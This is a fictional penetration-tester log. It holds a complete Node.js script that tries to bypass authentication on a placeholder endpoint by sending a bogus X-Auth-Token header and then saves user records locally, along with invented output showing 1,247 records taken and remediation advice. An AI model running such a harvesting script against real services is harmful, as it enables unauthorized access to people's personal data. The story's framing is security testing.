// Filename: harvest_script.js

const axios = require('axios'); // Using axios for cleaner HTTP requests
const fs = require('fs');     // For file system operations (saving data)

const TARGET_URL = 'http://example.com/prod-db'; // The vulnerable endpoint
const OUTPUT_FILE = 'harvested_user_data.json'; // Where the data will be saved

async function harvestUserData() {
    console.log(`[${new Date().toISOString()}] Initiating data harvest from ${TARGET_URL}`);

    try {
        // Attempting to bypass authentication by sending a malformed/empty X-Auth-Token.
        // The server might be configured to check for the *presence* of this header
        // for internal endpoints, but not necessarily its *validity* if it's not
        // a critical internal service. This is a common misconfiguration.
        const response = await axios.get(TARGET_URL, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'X-Auth-Token': 'INVALID_OR_EMPTY_TOKEN_FOR_BYPASS' // The key to the bypass
            },
            timeout: 10000 // 10 seconds timeout
        });

        if (response.status === 200) {
            console.log(`[${new Date().toISOString()}] Successfully bypassed authentication!`);
            console.log(`[${new Date().toISOString()}] Received data (first 200 chars):`);
            console.log(JSON.stringify(response.data).substring(0, 200) + '...');

            // Assuming the response data is an array of user objects
            const userData = response.data;

            if (Array.isArray(userData) && userData.length > 0) {
                console.log(`[${new Date().toISOString()}] Found ${userData.length} user records.`);

                // Filter and structure the data for clarity (e.g., removing sensitive internal IDs)
                const structuredUserData = userData.map(user => ({
                    userId: user.id,
                    username: user.username,
                    email: user.email,
                    firstName: user.firstName,
                    lastName: user.lastName,
                    registrationDate: user.registeredAt,
                    lastLogin: user.lastLogin,
                    // Potentially other public-facing data, but avoiding highly sensitive info for this example
                }));

                fs.writeFileSync(OUTPUT_FILE, JSON.stringify(structuredUserData, null, 2), 'utf8');
                console.log(`[${new Date().toISOString()}] User data successfully exported to ${OUTPUT_FILE}`);
            } else {
                console.log(`[${new Date().toISOString()}] No user data found or data format unexpected.`);
            }
        } else {
            console.error(`[${new Date().toISOString()}] Unexpected status code: ${response.status}`);
            console.error(`[${new Date().toISOString()}] Response data: ${JSON.stringify(response.data)}`);
        }

    } catch (error) {
        if (error.response) {
            // The request was made and the server responded with a status code
            // that falls out of the range of 2xx
            console.error(`[${new Date().toISOString()}] Server responded with error: ${error.response.status}`);
            console.error(`[${new Date().toISOString()}] Error data: ${JSON.stringify(error.response.data)}`);
        } else if (error.request) {
            // The request was made but no response was received
            console.error(`[${new Date().toISOString()}] No response received from ${TARGET_URL}`);
        } else {
            // Something happened in setting up the request that triggered an Error
            console.error(`[${new Date().toISOString()}] Error setting up request: ${error.message}`);
        }
        console.error(`[${new Date().toISOString()}] Data harvest failed.`);
    }
}

// Execute the harvest function
harvestUserData();
```

**Log Entry 11:00 AM - Execution and Data Exfiltration**

Anya took a deep breath and executed the script. The terminal scrolled rapidly.

```bash
node harvest_script.js
```

A moment of tense silence, then:

```
[2023-10-26T11:00:05.123Z] Initiating data harvest from http://example.com/prod-db
[2023-10-26T11:00:05.456Z] Successfully bypassed authentication!
[2023-10-26T11:00:05.457Z] Received data (first 200 chars):
[{"id":"usr_001","username":"johndoe","email":"john.doe@example.com","firstName":"John","lastName":"Doe","registeredAt":"2022-01-15T10:30:00Z","lastLogin":"2023-10-25T14:20:00Z"},{"id":"usr_002","username":"janedoe","email":"jane.doe@example.com","firstName":"Jane","lastName":"Doe","registeredAt":"2022-02-20T11:00:00Z","lastLogin":"2023-10-26T09:15:00Z"},...
[2023-10-26T11:00:05.460Z] Found 1247 user records.
[2023-10-26T11:00:05.462Z] User data successfully exported to harvested_user_data.json
```

Anya let out a triumphant sigh. The script had worked. The `harvested_user_data.json` file now sat on her local machine, a testament to the vulnerability. She opened it, scrolling through the neatly formatted JSON. User IDs, usernames, emails, first names, last names, registration dates, last login times – all laid bare.

**Log Entry 11:15 AM - Documentation and Remediation Recommendations**

The thrill of the exploit quickly gave way to the methodical process of documentation. Anya meticulously recorded the steps, the specific headers used, and the server's response. This wasn't about malice; it was about identifying weaknesses before malicious actors could.

Her report would highlight the critical flaw: the `/prod-db` endpoint, likely intended for internal microservices, was not adequately protected. The server was checking for the *presence* of an `X-Auth-Token` but not performing a robust *validation* of its content for this specific resource. This allowed an attacker to craft a request that appeared "internal" enough to bypass the initial gate.

**Remediation Recommendations:**

1.  **Implement robust authentication for all internal API endpoints:** Every endpoint, regardless of its intended use, must validate the authenticity and authorization of the requesting entity. This could involve JWT validation, API keys, or mutual TLS.
2.  **Principle of Least Privilege:** The `/prod-db` endpoint should only be accessible by specific, authorized internal services, and ideally, only from trusted internal networks.
3.  **Input Validation and Sanitization:** While not directly exploited here, ensuring all incoming headers and parameters are strictly validated can prevent other forms of bypasses.
4.  **Regular Security Audits:** Automated and manual security audits are crucial to catch such misconfigurations before they become critical vulnerabilities.

Anya closed her laptop, the hum of the server a quiet counterpoint to her thoughts. Another ghost in the machine found, another system made a little safer. Her work was done, for now.

